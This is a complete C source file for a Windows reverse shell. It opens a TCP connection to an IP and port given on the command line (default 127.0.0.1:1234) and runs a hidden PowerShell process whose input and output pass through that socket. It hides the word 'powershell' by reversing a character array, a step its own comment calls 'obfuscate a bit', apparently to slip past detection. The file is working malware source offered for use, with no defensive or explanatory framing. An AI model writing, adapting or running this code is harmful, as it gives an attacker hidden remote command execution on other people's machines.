#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {

	// configure here the server address and port
	char *server_IP = "127.0.0.1";
	int server_port = 1234;

	// check arguments, eventually set IP and port
	if (argc == 3){
		// set the server IP from the command line
		server_IP = argv[1];
		server_port = atoi(argv[2]);
	}

	
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		printf("-->Error: WSASturtup failed.\n");
		return 1;
	}

	int port = server_port;
	struct sockaddr_in malsa;
	SOCKET mysock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	malsa.sin_family = AF_INET;
	malsa.sin_port = htons(port);
	malsa.sin_addr.s_addr = inet_addr(server_IP);

	
	Sleep(500);
	
	if (connect(mysock, (struct sockaddr *) &malsa, sizeof(malsa)) != 0) {
		printf("--> ERROR: Connection failed.\n");
		return 1;
	}

	//obfuscate a bit ______________________________________________
	char arr_pot[] = {'\0','l','l','e','h','s','r','e','w','o','p'};
	char tmp; int i, j; 

	for (i = 0, j = 10; i < j; i++, j--) { // loop to swap elements
        tmp = arr_pot[i];
        arr_pot[i] = arr_pot[j];
        arr_pot[j] = tmp;
    }

	// printf(" %s\n", arr_pot);
	//______________________________________________________________
		
	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE) mysock;
	sinfo.hStdOutput = (HANDLE) mysock;
	sinfo.hStdError = (HANDLE) mysock;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, arr_pot, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return 0;
}